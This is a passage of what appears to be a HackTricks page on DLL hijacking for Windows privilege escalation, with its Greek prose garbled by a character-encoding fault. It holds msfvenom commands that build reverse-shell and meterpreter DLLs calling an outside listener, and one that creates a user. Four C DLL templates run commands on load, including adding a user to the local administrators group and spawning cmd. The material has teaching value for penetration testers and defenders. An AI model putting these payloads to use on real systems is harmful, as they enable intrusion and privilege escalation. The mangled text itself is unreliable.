ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î­Ï‚ ÎµÎ½ÏŒÏ‚ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎµÎ¾Î±Î³Ï‰Î³Î­Ï‚ ÎµÎ½ÏŒÏ‚ dll Î¼Îµ:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Î“Î¹Î± Î¿Î´Î·Î³Î¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Ï€ÏÏ‚ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ Dll Hijacking Î³Î¹Î± Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î­Î½Î±Î½ Ï†Î¬ÎºÎµÎ»Î¿ **System Path**, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î±Î½ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï†Î¬ÎºÎµÎ»Î¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± PATH.\
Î†Î»Î»Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ÎºÎ±Î¹ _Write-HijackDll._

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ, Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ Ï€ÏÎ¬Î³Î¼Î±Ï„Î± Î³Î¹Î± Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Îµ ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î± Î¸Î± Î®Ï„Î±Î½ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± dll Ï€Î¿Ï… Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€Î¿Ï… Î¸Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ**. Î Î±ÏÏŒÎ»Î± Î±Ï…Ï„Î¬, Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Ï„Î¿ Dll Hijacking ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± [Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Medium Integrity ÏƒÏ„Î¿ High **(Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï„Î¿Ï… UAC)**](../authentication-credentials-uac-and-efs.md#uac) Î® Î±Ï€ÏŒ Ï„Î¿ **High Integrity ÏƒÏ„Î¿ SYSTEM**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± **Ï€ÏÏ‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ dll** Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î· Î¼ÎµÎ»Î­Ï„Î· Î³Î¹Î± Ï„Î¿ dll hijacking Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÏƒÏ„Î·Î½ **ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼ÎµÏÎ¹ÎºÎ¿ÏÏ‚ **Î²Î±ÏƒÎ¹ÎºÎ¿ÏÏ‚ ÎºÏÎ´Î¹ÎºÎµÏ‚ dll** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿Î¹ Ï‰Ï‚ **Ï€ÏÏŒÏ„Ï…Ï€Î±** Î® Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± **dll Î¼Îµ Î¼Î· Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ ÎµÎ¾Î±Î³ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚**.

## **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ ÏƒÏ…Î³Î³ÏÎ±Ï†Î® Dlls**

### **Dll Proxifying**

Î’Î±ÏƒÎ¹ÎºÎ¬, Î­Î½Î± **Dll proxy** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Dll Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¹ÎºÎ±Î½ÏŒ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ¬ ÏƒÎ±Ï‚ ÏŒÏ„Î±Î½ Ï†Î¿ÏÏ„ÏÎ½ÎµÏ„Î±Î¹**, Î±Î»Î»Î¬ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **ÎµÎºÎ¸Î­Ï„ÎµÎ¹** ÎºÎ±Î¹ Î½Î± **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯** ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Î¼Î­Î½ÎµÏ„Î±Î¹ **Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Î½Ï„Î±Ï‚ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·**.

ÎœÎµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) Î® [**Spartacus**](https://github.com/Accenture/Spartacus) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Î½Î± **Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Î­Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿ ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·** Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ proxify ÎºÎ±Î¹ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± proxified dll** Î® Î½Î± **Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ Dll** ÎºÎ±Î¹ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± proxified dll**.

### **Meterpreter**

**Î›Î®ÏˆÎ· Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î·Ï‚ ÎºÎµÎ»ÏÏ†Î¿Ï…Ï‚ (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î­Î½Î± meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï‡ÏÎ®ÏƒÏ„Î· (x86 Î”ÎµÎ½ ÎµÎ¯Î´Î± Î¼Î¹Î± Î­ÎºÎ´Î¿ÏƒÎ· x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Î”Î¹ÎºÏŒ ÏƒÎ±Ï‚

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¿ Dll Ï€Î¿Ï… ÏƒÏ…Î½Ï„Î¬ÏƒÏƒÎµÏ„Îµ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎ¾Î¬Î³ÎµÎ¹ Ï€Î¿Î»Î»Î­Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** Ï€Î¿Ï… Î¸Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î· Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Î¸ÏÎ¼Î±, Î±Î½ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï„Î¿ **Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± Ï„Î¹Ï‚ Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹** ÎºÎ±Î¹ Î· **ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Î•Î¬Î½ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎµÏƒÏ„Îµ Î³Î¹Î± Î¼Î¹Î± **ÎºÎ±ÏÎ¹Î­ÏÎ± ÏƒÏ„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº** ÎºÎ±Î¹ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï‡Î±ÎºÎµÏÎµÏ„Îµ Ï„Î¿ Î±Î´ÏÎ½Î±Ï„Î¿ - **Ï€ÏÎ¿ÏƒÎ»Î±Î¼Î²Î¬Î½Î¿Ï…Î¼Îµ!** (_Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î¬ÏÎ¹ÏƒÏ„Î· Î³Î½ÏÏƒÎ· Î³ÏÎ±Ï€Ï„Î¿Ï ÎºÎ±Î¹ Ï€ÏÎ¿Ï†Î¿ÏÎ¹ÎºÎ¿Ï Î Î¿Î»Ï‰Î½Î¹ÎºÏÎ½_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î Î‘ÎšÎ•Î¤Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
